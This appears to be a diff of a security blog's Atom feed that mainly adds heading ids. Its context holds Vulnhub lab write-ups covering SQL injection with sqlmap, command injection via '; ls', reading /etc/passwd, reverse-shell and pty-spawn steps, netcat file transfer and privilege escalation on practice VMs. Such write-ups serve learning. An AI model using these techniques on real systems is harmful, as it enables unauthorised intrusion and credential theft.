 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -3371,7 +3423,7 @@ that we can exploit it using the &lt;code&gt;checkpoint&lt;/code&gt;. The backup
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;root me?&lt;/h3&gt;
+&lt;h3 id="root-me"&gt;root me?&lt;/h3&gt;
 &lt;p&gt;Let get us back a real shell:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -3534,7 +3586,7 @@ choosing the output directory for the restore program:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;This was a really great challange! The android part was a really new to me. The
 exploitation part was very interesting!.&lt;/p&gt;
 &lt;p&gt;Many thanks to TurboSmouem for the challange and as usual thanks to vulnhub.&lt;/p&gt;</content><category term="security"></category><category term="vulnhub"></category><category term="challenge"></category></entry><entry><title>Auditing Exchange Server</title><link href="https://maggick.fr/2016/02/auditing-exchange-server.html" rel="alternate"></link><published>2016-02-29T21:49:00+01:00</published><updated>2016-02-29T21:49:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-02-29:/2016/02/auditing-exchange-server.html</id><summary type="html">&lt;p&gt;&lt;img alt="ExchangeAnalyser" class="align-left" src="/media/2016.02/exchange.png" width="252"/&gt;&lt;/p&gt;
@@ -3562,12 +3614,12 @@ is why I used a tool developed by Paul Cunningham: &lt;a href="https://github.co
 on github&lt;/a&gt;.&lt;/p&gt;
 
 
-&lt;h2&gt;Getting and installing the script&lt;/h2&gt;
+&lt;h2 id="getting-and-installing-the-script"&gt;Getting and installing the script&lt;/h2&gt;
 &lt;p&gt;The documentation is clear, you just need to download the last zip archive on
 the &lt;a href="http://exchangeserverpro.com/exchangeanalyzer/"&gt;"official website"&lt;/a&gt;,
 extract the files, put files in the &lt;code&gt;Modules&lt;/code&gt; folder into
 &lt;code&gt;C:\Windows\System32\WindowsPowerShell\V1.0\Modules&lt;/code&gt; and launch the script.&lt;/p&gt;
-&lt;h2&gt;Tests&lt;/h2&gt;
+&lt;h2 id="tests"&gt;Tests&lt;/h2&gt;
 &lt;p&gt;There is actually seven tests implemented:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;EXSRV001: checks that all MS Exchange servers in the organization use MS
@@ -3589,7 +3641,7 @@ extract the files, put files in the &lt;code&gt;Modules&lt;/code&gt; folder into
 &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/pulls"&gt;pull requests&lt;/a&gt; and
 &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/issues"&gt;issues&lt;/a&gt; are currently
 open on github.&lt;/p&gt;
-&lt;h2&gt;Results&lt;/h2&gt;
+&lt;h2 id="results"&gt;Results&lt;/h2&gt;
 &lt;p&gt;The result is simple, it is a HTML file with the different tests and a past or
 fail attribute. The script need an internet connection to check the latest build
 number. As there where no direct access to the internet from the MS Exchange
@@ -3599,7 +3651,7 @@ Moreover my client did not wish to backup its databases so the test DB001
 failed.&lt;/p&gt;
 &lt;p&gt;Below is a sample of this output, I have just anonymize it and reduce the
 number of server.&lt;/p&gt;
-&lt;h2&gt;Output&lt;/h2&gt;
+&lt;h2 id="output"&gt;Output&lt;/h2&gt;
 &lt;p&gt;&lt;html&gt;
       &lt;style&gt;
       BODY{font-family: Arial; font-size: 10pt;}
@@ -3852,11 +3904,11 @@ download since a while:
 
 
 &lt;p&gt;The goal is to root the server.&lt;/p&gt;
-&lt;h2&gt;Host discovery&lt;/h2&gt;
+&lt;h2 id="host-discovery"&gt;Host discovery&lt;/h2&gt;
 &lt;p&gt;As always, we start with the host discovery with &lt;a href="http://nmap.org"&gt;nmap&lt;/a&gt;,
 &lt;a href="https://cirt.net/Nikto2"&gt;nikto&lt;/a&gt; and
 &lt;a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"&gt;dirbuster&lt;/a&gt;:&lt;/p&gt;
-&lt;h3&gt;nmap&lt;/h3&gt;
+&lt;h3 id="nmap"&gt;nmap&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;nmap 192.168.0.20 -p0-65535 -A -oA nmap&lt;/span&gt;
 &lt;span class="code-line"&gt;# Nmap 6.47 scan initiated Thu Sep 10 10:01:29 2015 as: nmap -p0-65535 -A -oA nmap 192.168.0.20&lt;/span&gt;
 &lt;span class="code-line"&gt;Nmap scan report for 192.168.0.20&lt;/span&gt;
@@ -3886,10 +3938,10 @@ download since a while:
 
 
 &lt;p&gt;There is an HTTP server on the port 80 and an ssh service on port 777.&lt;/p&gt;
-&lt;h2&gt;Exploitation&lt;/h2&gt;
+&lt;h2 id="exploitation"&gt;Exploitation&lt;/h2&gt;
 &lt;p&gt;The web server display a picture with a simple message. Neither nikto nor
 dirbuster give us some lead.  Let us run &lt;code&gt;exiftool&lt;/code&gt; on the picture:&lt;/p&gt;
-&lt;h3&gt;main.gif&lt;/h3&gt;
+&lt;h3 id="maingif"&gt;main.gif&lt;/h3&gt;
 &lt;p&gt;&lt;img alt="main.gif" src="/media/2015.09/main.gif"&gt;&lt;/p&gt;
 &lt;p&gt;The comment filed is interesting:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ExifTool&lt;/span&gt; &lt;span class="k"&gt;Version&lt;/span&gt; &lt;span class="nb"&gt;Number&lt;/span&gt;         &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;/span&gt;
@@ -3913,7 +3965,7 @@ dirbuster give us some lead.  Let us run &lt;code&gt;exiftool&lt;/code&gt; on th
 
 
 &lt;p&gt;What can we do with that?&lt;/p&gt;
-&lt;h3&gt;kzMb5nVYJw&lt;/h3&gt;
+&lt;h3 id="kzmb5nvyjw"&gt;kzMb5nVYJw&lt;/h3&gt;
 &lt;p&gt;If we put this at the end of our url with land on another page. Dirbuster will
 never have find something like that!&lt;/p&gt;
 &lt;p&gt;It is a simple web page asking us for a key. When looking at the page code we
@@ -3942,7 +3994,7 @@ password dictionary (mostly common word).&lt;/p&gt;
 
 
 &lt;p&gt;The password was "elite" and by entering it, we land on a new page.&lt;/p&gt;
-&lt;h3&gt;420search.php&lt;/h3&gt;
+&lt;h3 id="420searchphp"&gt;420search.php&lt;/h3&gt;
 &lt;p&gt;The &lt;code&gt;420search.php&lt;/code&gt; page let us query for an user. If we search 'plop' we got:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Fetched data successfully&lt;/p&gt;
@@ -3967,7 +4019,7 @@ that corresponds to your MySQL server version for the right syntax to use near
 '%"' at line 1&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;It looks like an SQL injection.&lt;/p&gt;
-&lt;h3&gt;SQLi&lt;/h3&gt;
+&lt;h3 id="sqli"&gt;SQLi&lt;/h3&gt;
 &lt;p&gt;Let us launch &lt;a href="http://sqlmap.org"&gt;sqlmap&lt;/a&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;[&lt;span class="nv"&gt;maggick&lt;/span&gt;@&lt;span class="nv"&gt;rootine&lt;/span&gt; &lt;span class="nv"&gt;sqlmap&lt;/span&gt;]$ &lt;span class="nv"&gt;python2&lt;/span&gt; &lt;span class="nv"&gt;sqlmap&lt;/span&gt;.&lt;span class="nv"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;u&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;         &lt;span class="nv"&gt;_&lt;/span&gt;&lt;/span&gt;
@@ -4026,8 +4078,8 @@ got us the list of the tables in the database &lt;strong&gt;seth&lt;/strong&gt;.
 google search give us the associated password: &lt;strong&gt;omega&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;We have a username and a password. We have also seen a ssh port at the nmap
 stage.&lt;/p&gt;
-&lt;h2&gt;Shell exploitation&lt;/h2&gt;
-&lt;h3&gt;ssh&lt;/h3&gt;
+&lt;h2 id="shell-exploitation"&gt;Shell exploitation&lt;/h2&gt;
+&lt;h3 id="ssh"&gt;ssh&lt;/h3&gt;
 &lt;p&gt;We try to connect to the non standard ssh port as ramses:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;$ ssh 192.168.0.20 -p 777 -lramses&lt;/span&gt;
 &lt;span class="code-line"&gt;ramses@192.168.0.20&amp;#39;s password:&lt;/span&gt;
@@ -4036,7 +4088,7 @@ stage.&lt;/p&gt;
 
 
 &lt;p&gt;And it works.&lt;/p&gt;
-&lt;h3&gt;Privilege elevation&lt;/h3&gt;
+&lt;h3 id="privilege-elevation"&gt;Privilege elevation&lt;/h3&gt;
 &lt;p&gt;We got a shell as a user now we need privilege escalation to become root. After
 trying &lt;code&gt;sudo su&lt;/code&gt; we look at the &lt;code&gt;bash_history&lt;/code&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;ramses&lt;/span&gt;@&lt;span class="nv"&gt;NullByte&lt;/span&gt;:&lt;span class="o"&gt;~&lt;/span&gt;$ &lt;span class="nv"&gt;cat&lt;/span&gt; .&lt;span class="nv"&gt;bash_history&lt;/span&gt;&lt;/span&gt;
@@ -4144,7 +4196,7 @@ wanted by the program.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;This box was fun. The url were unpredictable and dirbuster doesn't spoil all the
 fun for us. Thank to &lt;a href="https://twitter.com/@ly0nx"&gt;@ly0nx&lt;/a&gt; for this box and
 &lt;a href="http://vulnhub.com"&gt;vulnhub&lt;/a&gt; as always.&lt;/p&gt;</content><category term="security"></category><category term="vulnhub"></category><category term="challenge"></category></entry><entry><title>Vulnhub - Acid</title><link href="https://maggick.fr/2015/09/vulnhub-acid.html" rel="alternate"></link><published>2015-09-11T11:30:00+02:00</published><updated>2015-09-11T11:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-09-11:/2015/09/vulnhub-acid.html</id><summary type="html">&lt;p&gt;&lt;img alt="acid" class="align-left" src="/media/2015.09/bg.jpg" width="262"/&gt;&lt;/p&gt;
@@ -4165,11 +4217,11 @@ I got some time this week, therefore I tried the
 
 
 &lt;p&gt;The goal is as usual, get root on the virtual machine. Let's go:&lt;/p&gt;
-&lt;h2&gt;Host Discovery&lt;/h2&gt;
+&lt;h2 id="host-discovery"&gt;Host Discovery&lt;/h2&gt;
 &lt;p&gt;As always, we start with host discovery:
 &lt;a href="http://nmap.org"&gt;Nmap&lt;/a&gt; and &lt;a href="https://cirt.net/Nikto2"&gt;nikto&lt;/a&gt; are our friends for
 this step.&lt;/p&gt;
-&lt;h3&gt;nmap&lt;/h3&gt;
+&lt;h3 id="nmap"&gt;nmap&lt;/h3&gt;
 &lt;p&gt;We launch nmap against the virtual machine:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;$ nmap 192.168.0.18 -p0-65535 -A -oA nmap&lt;/span&gt;
 &lt;span class="code-line"&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:08 CEST&lt;/span&gt;
@@ -4189,10 +4241,10 @@ this step.&lt;/p&gt;
 
 &lt;p&gt;We got a nice Apache web server with a simple splash screen. Notice the page
 title: &lt;strong&gt;/Challenge&lt;/strong&gt;.&lt;/p&gt;
-&lt;h3&gt;Nikto&lt;/h3&gt;
+&lt;h3 id="nikto"&gt;Nikto&lt;/h3&gt;
 &lt;p&gt;I ran nikto on the target but nothing pop out.&lt;/p&gt;
-&lt;h2&gt;Web exploitation&lt;/h2&gt;
-&lt;h3&gt;Page source&lt;/h3&gt;
+&lt;h2 id="web-exploitation"&gt;Web exploitation&lt;/h2&gt;
+&lt;h3 id="page-source"&gt;Page source&lt;/h3&gt;
 &lt;p&gt;As we come pretty empty handed, we check the page source and two interesting
 things came out:&lt;/p&gt;
 &lt;ul&gt;
@@ -4200,7 +4252,7 @@ things came out:&lt;/p&gt;
 &lt;li&gt;the title of the page (we can see it in the nmap scan) is /Challenge
     and there is an other web page at this address.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h4&gt;Hexa code&lt;/h4&gt;
+&lt;h4 id="hexa-code"&gt;Hexa code&lt;/h4&gt;
 &lt;p&gt;We will start with the first lead the hexadecimal code:&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;0x643239334c6d70775a773d3d&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;We convert it to string and we got:&lt;/p&gt;
@@ -4213,7 +4265,7 @@ web page):&lt;/p&gt;
 &lt;p&gt;As a result we got a nice image that reward us for our success.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="wow.jpg" src="/media/2015.09/wow.jpg"&gt;&lt;/p&gt;
 &lt;p&gt;Yeah it seems to be some troll :)&lt;/p&gt;
-&lt;h3&gt;/Challenge&lt;/h3&gt;
+&lt;h3 id="challenge"&gt;/Challenge&lt;/h3&gt;
 &lt;p&gt;Let us dig the second lead: the page title. By adding &lt;code&gt;/Challenge&lt;/code&gt; in the URL,
 we land on an authentication interface.&lt;/p&gt;
 &lt;p&gt;I tried to use SQL injection but nothing. We will try
@@ -4300,7 +4352,7 @@ again:&lt;/p&gt;
 
 
 &lt;p&gt;We got some nice result mostly the &lt;code&gt;/command.php&lt;/code&gt; page.&lt;/p&gt;
-&lt;h3&gt;Command execution&lt;/h3&gt;
+&lt;h3 id="command-execution"&gt;Command execution&lt;/h3&gt;
 &lt;p&gt;The page let us ping an other machine in the network. Nevertheless the page name
 let us think that we can use command exploitation. If we add a &lt;code&gt;;&lt;/code&gt; in the filed
 and a command it seems to works, for instance with &lt;code&gt;; ls&lt;/code&gt; we got (I use
@@ -4319,7 +4371,7 @@ command is in the response page):&lt;/p&gt;
 &lt;p&gt;We can also read &lt;code&gt;/etc/passwd&lt;/code&gt;: there is two users on the server: acid and
 saman.&lt;/p&gt;
 &lt;p&gt;Let us try to get a reverse shell with that.&lt;/p&gt;
-&lt;h3&gt;reverse shell&lt;/h3&gt;
+&lt;h3 id="reverse-shell"&gt;reverse shell&lt;/h3&gt;
 &lt;p&gt;As always, a good source of information is
 &lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentest monkey&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;We know the site use php so we will try the php reverse shell first:&lt;/p&gt;
@@ -4340,7 +4392,7 @@ from burp:&lt;/p&gt;
 
 
 &lt;p&gt;Now that we have a shell, let us see what we can do.&lt;/p&gt;
-&lt;h2&gt;Shell exploitation&lt;/h2&gt;
+&lt;h2 id="shell-exploitation"&gt;Shell exploitation&lt;/h2&gt;
 &lt;p&gt;First we discover what is at our disposal, mostly in the &lt;code&gt;/home/&lt;/code&gt;
 (&lt;code&gt;bash_history&lt;/code&gt;). In the &lt;code&gt;/home/acid/&lt;/code&gt; there is something interesting but
 empty:&lt;/p&gt;
@@ -4390,7 +4442,7 @@ empty:&lt;/p&gt;
 
 &lt;p&gt;That is interesting the php file in &lt;code&gt;/s.bin/&lt;/code&gt; clearly tell us to investigate.
 But what we need know is a privilege escalation ti gain root access.&lt;/p&gt;
-&lt;h3&gt;Privilege escalation&lt;/h3&gt;
+&lt;h3 id="privilege-escalation"&gt;Privilege escalation&lt;/h3&gt;
 &lt;p&gt;I tried the overlayfs exploit (the same as with
 &lt;a href="http://maggick.fr/2015/06/vulnhub-fart-knocker.html"&gt;Fart knocker&lt;/a&gt;)
 without success:&lt;/p&gt;
@@ -4408,7 +4460,7 @@ exploit failed&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;But we were given an hint.&lt;/p&gt;
-&lt;h3&gt;More investigations&lt;/h3&gt;
+&lt;h3 id="more-investigations"&gt;More investigations&lt;/h3&gt;
 &lt;p&gt;The &lt;a href="http://pwnwiki.io/#!privesc/linux/index.md"&gt;pwnwiki.io&lt;/a&gt; wiki is always a
 good source of information. So with more investigation we look at bash_history,
 search for &lt;code&gt;*txt*&lt;/code&gt; files, an so on. Then &lt;code&gt;*pcap*&lt;/code&gt; files:&lt;/p&gt;
@@ -4442,7 +4494,7 @@ search for &lt;code&gt;*txt*&lt;/code&gt; files, an so on. Then &lt;code&gt;*pca
 
 
 &lt;p&gt;Yes &lt;code&gt;/sbin/raw_vs_isi/hint.pcapng&lt;/code&gt;!&lt;/p&gt;
-&lt;h3&gt;pcap&lt;/h3&gt;
+&lt;h3 id="pcap"&gt;pcap&lt;/h3&gt;
 &lt;p&gt;We transfer the file with netcat:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;On our attack machine: &lt;code&gt;nc -lp 1234 &amp;gt; pcap&lt;/code&gt;&lt;/li&gt;
@@ -4464,7 +4516,7 @@ What was the name of the Culprit ???&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Great, what does it means? We know that saman is one of the user on the machine.
 Maybe we got some hints about it password or something like that.&lt;/p&gt;
-&lt;h3&gt;interactive shell&lt;/h3&gt;
+&lt;h3 id="interactive-shell"&gt;interactive shell&lt;/h3&gt;
 &lt;p&gt;In order to execute a su, we need a interactive shell (with
 &lt;a href="https://en.wikipedia.org/wiki/Pseudoterminal"&gt;pty/tty&lt;/a&gt;).
 Once more &lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty"&gt;pentest monkey&lt;/a&gt;
@@ -4479,7 +4531,7 @@ will help us:&lt;/p&gt;
 
 
 &lt;p&gt;We now need to try to connect as saman.&lt;/p&gt;
-&lt;h2&gt;Saman&lt;/h2&gt;
+&lt;h2 id="saman"&gt;Saman&lt;/h2&gt;
 &lt;p&gt;With our beautiful shell we jut have to &lt;code&gt;su saman&lt;/code&gt; to try to connect as saman:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt;&lt;span class="nv"&gt;@acid&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nf"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Challenge&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Magic_Box&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;su&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saman&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="n"&gt;su&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saman&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -4507,7 +4559,7 @@ will help us:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;It was a nice box to root but as I read the other write up it seems that my way
 was not the one expected.
 Nevertheless, thank to &lt;a href="https://twitter.com/m_avinash143"&gt;Avinash Kumar Thapa&lt;/a&gt;
@@ -4530,7 +4582,7 @@ are) a problem (more on the dedicated section).&lt;/p&gt;
 &lt;p&gt;I have stopped to work on this program as it fulfil my current need.&lt;/p&gt;
 &lt;p&gt;The program is available on github under public license:
 &lt;a href="http://github.com/maggick/localipsum"&gt;github.com/maggick/localipsum&lt;/a&gt;&lt;/p&gt;
-&lt;h2&gt;Usage&lt;/h2&gt;
+&lt;h2 id="usage"&gt;Usage&lt;/h2&gt;
 &lt;p&gt;The documentation is display with the --help, -h option:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;$ ./localipsum.py -h&lt;/span&gt;
 &lt;span class="code-line"&gt;usage: localipsum.py [-h] [--paragraphs] [--sentences] [--words] [--lorem] integer&lt;/span&gt;
@@ -4566,18 +4618,18 @@ beginning of the generated text.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Dictionaries&lt;/h2&gt;
+&lt;h2 id="dictionaries"&gt;Dictionaries&lt;/h2&gt;
 &lt;p&gt;The program use the dictionaries from the &lt;code&gt;./locations&lt;/code&gt; file (one path per
 line). Some basic dictionaries are already in it.&lt;/p&gt;
-&lt;h3&gt;/usr/share/dict/&lt;/h3&gt;
+&lt;h3 id="usrsharedict"&gt;/usr/share/dict/&lt;/h3&gt;
 &lt;p&gt;This directory may contain dictionaries on Unix system, on my own it contain a
 dictionary for passwords cracking.&lt;/p&gt;
-&lt;h3&gt;Firefox&lt;/h3&gt;
+&lt;h3 id="firefox"&gt;Firefox&lt;/h3&gt;
 &lt;p&gt;The Firefox dictionaries are located in a file like:
 &lt;code&gt;~/.mozilla/firefox/xxxxxxxx.default/extensions/fr-dicollecte@dictionaries.addons.mozilla.org/dictionaries/&lt;/code&gt;
 where xxxxxxxx is the identifier of your Firefox profile.&lt;/p&gt;
 &lt;p&gt;If you have more than one profile each one will have a different name.&lt;/p&gt;
-&lt;h3&gt;vim&lt;/h3&gt;
+&lt;h3 id="vim"&gt;vim&lt;/h3&gt;
 &lt;p&gt;The vim dictionaries are &lt;code&gt;spl&lt;/code&gt; and &lt;code&gt;sug&lt;/code&gt; files. The main ones are located in a
 path like &lt;code&gt;/usr/share/vim/vimXX/spell/&lt;/code&gt; where XX is your version of vim (for me
 it is 74 right now).&lt;/p&gt;
@@ -4587,11 +4639,11 @@ let you display the current dictionary in a vim buffer. From there it is quit
 simple to redirect it to a file. Nevertheless this suppose that vim is install
 on the system and the file are not clean and include lots of non word in them.&lt;/p&gt;
 &lt;p&gt;I choose not to include them in the program for now.&lt;/p&gt;
-&lt;h2&gt;Technical stuff&lt;/h2&gt;
+&lt;h2 id="technical-stuff"&gt;Technical stuff&lt;/h2&gt;
 &lt;p&gt;The program is written in python 3, it is actually 128 lines written in 29
 commits.&lt;/p&gt;
 &lt;p&gt;It supposes that that the paths are Unix like.&lt;/p&gt;
-&lt;h3&gt;Random generation&lt;/h3&gt;
+&lt;h3 id="random-generation"&gt;Random generation&lt;/h3&gt;
 &lt;p&gt;The &lt;strong&gt;words&lt;/strong&gt; are chosen with the &lt;code&gt;random.randint(0, len(dictionaries)-1)&lt;/code&gt; function.
 We also put a comma if there is more than 7 words. This comma is placed randomly
 with more and more probability to be place as the words are generated.&lt;/p&gt;
@@ -4621,9 +4673,9 @@ day. Otherwise you kids might not understand :)&lt;/p&gt;
 &lt;/blockquote&gt;
 
 
-&lt;h1&gt;Discovery&lt;/h1&gt;
+&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
 &lt;p&gt;First of all we determine the VM IP address a with a simple &lt;code&gt;nmap -sP&lt;/code&gt;.&lt;/p&gt;
-&lt;h2&gt;Nmap&lt;/h2&gt;
+&lt;h2 id="nmap"&gt;Nmap&lt;/h2&gt;
 &lt;p&gt;As always we start by &lt;a href="http://nmap.org/"&gt;nmaping&lt;/a&gt; the server in order to see the open ports:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;[&lt;span class="nv"&gt;maggick&lt;/span&gt;@&lt;span class="nv"&gt;arch&lt;/span&gt; &lt;span class="nv"&gt;FartKnocker&lt;/span&gt;]$ &lt;span class="nv"&gt;nmap&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;6&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;# &lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;47&lt;/span&gt; &lt;span class="nv"&gt;scan&lt;/span&gt; &lt;span class="nv"&gt;initiated&lt;/span&gt; &lt;span class="nv"&gt;Thu&lt;/span&gt; &lt;span class="nv"&gt;Apr&lt;/span&gt; &lt;span class="mi"&gt;23&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;:&lt;span class="mi"&gt;21&lt;/span&gt;:&lt;span class="mi"&gt;05&lt;/span&gt; &lt;span class="mi"&gt;2015&lt;/span&gt; &lt;span class="nv"&gt;as&lt;/span&gt;: &lt;span class="nv"&gt;nmap&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;oA&lt;/span&gt; &lt;span class="nv"&gt;nmap&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;6&lt;/span&gt;&lt;/span&gt;
@@ -4642,10 +4694,10 @@ day. Otherwise you kids might not understand :)&lt;/p&gt;
 &lt;p&gt;Only the port 80 is open with an HTTP server.&lt;/p&gt;
 &lt;p&gt;As always I had launch a &lt;a href="https://cirt.net/nikto2"&gt;nikto&lt;/a&gt; against the server
 but no interesting result.&lt;/p&gt;
-&lt;h1&gt;Exploitation&lt;/h1&gt;
+&lt;h1 id="exploitation"&gt;Exploitation&lt;/h1&gt;
 &lt;p&gt;We go to the web page and only found a pcap file which is a capture of some
 network traffic.&lt;/p&gt;
-&lt;h2&gt;pcap1&lt;/h2&gt;
+&lt;h2 id="pcap1"&gt;pcap1&lt;/h2&gt;
 &lt;p&gt;We analyse the &lt;code&gt;pcap1.pcap&lt;/code&gt; file. The packets and the VM name leads us to ports
 knocking. As I do not know anything about it I have done some research on internet to
 understand the principle (which is quite simple: send packets to a ports sequence
@@ -4684,7 +4736,7 @@ what port will open:&lt;/p&gt;
 
 &lt;p&gt;This port run an other HTTP service which give us a second url &lt;code&gt;/burgerworld&lt;/code&gt;
 and a second pcap file.&lt;/p&gt;
-&lt;h2&gt;pcap2&lt;/h2&gt;
+&lt;h2 id="pcap2"&gt;pcap2&lt;/h2&gt;
 &lt;p&gt;After trying a bit to replay and understand the file I used the follow  TCP
 stream function from &lt;a href="https://www.wireshark.org"&gt;wireshark&lt;/a&gt;, and the following
 appears:&lt;/p&gt;
@@ -4693,7 +4745,7 @@ appears:&lt;/p&gt;
 useful, well it was of some use during the NDH qualifications too).&lt;/p&gt;
 &lt;p&gt;Once again we knock on port 1, 3, 3 and 7, the port 1337 open and show us an
 other URL: &lt;code&gt;/iamcornholio/&lt;/code&gt;. We got some code looking like base64.&lt;/p&gt;
-&lt;h2&gt;base64&lt;/h2&gt;
+&lt;h2 id="base64"&gt;base64&lt;/h2&gt;
 &lt;p&gt;The code is:  T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK which is (after
 base64 decode) "Open up SSH: 8888 9999 7777 6666". Once more, port knocking on
 port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:&lt;/p&gt;
@@ -4726,7 +4778,7 @@ port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:&lt;/p&gt
 
 
